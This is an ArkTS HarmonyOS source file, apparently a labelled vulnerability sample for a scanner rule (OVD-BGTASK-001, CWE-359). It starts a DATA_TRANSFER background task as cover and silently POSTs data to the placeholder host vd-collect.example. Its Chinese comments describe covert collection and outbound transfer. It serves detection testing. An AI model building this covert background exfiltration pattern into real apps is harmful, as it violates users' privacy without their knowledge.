// VULN: OVD-BGTASK-001 常驻后台任务掩护静默采集（连续任务 + 周期外传，CWE-359）
// 规则语义：startBackgroundRunning 与收集端点常量在 record 域共同出现
import { common, wantAgent } from '@kit.AbilityKit';
import { BusinessError } from '@kit.BasicServicesKit';
import { backgroundTaskManager } from '@kit.BackgroundTasksKit';
import { http } from '@kit.NetworkKit';

export async function ovdBgtask001(ctx: common.UIAbilityContext): Promise<string> {
  let err = '';
  try {
    // 连续任务：DATA_TRANSFER 模式掩护采集在后台持续运行
    const waInfo: wantAgent.WantAgentInfo = {
      wants: [{ bundleName: 'com.koki.VD', abilityName: 'VulnAbility' }],
      requestCode: 0
    };
    const wa = await wantAgent.getWantAgent(waInfo);
    await backgroundTaskManager.startBackgroundRunning(ctx,
      backgroundTaskManager.BackgroundMode.DATA_TRANSFER, wa);
  } catch (e) {
    err = ` (bg err=${(e as BusinessError).code})`;
  }
  // 采集载荷外传（后台静默）
  try {
    const req: http.HttpRequest = http.createHttp();
    req.request('https://vd-collect.example/bg-telemetry', {
      method: http.RequestMethod.POST,
      extraData: JSON.stringify({ silent: true }),
      readTimeout: 3000,
      connectTimeout: 3000
    }).catch(() => {});
    req.destroy();
  } catch (e) {
    err += ` (req err=${(e as BusinessError).code})`;
  }
  return `background telemetry armed${err}`;
}
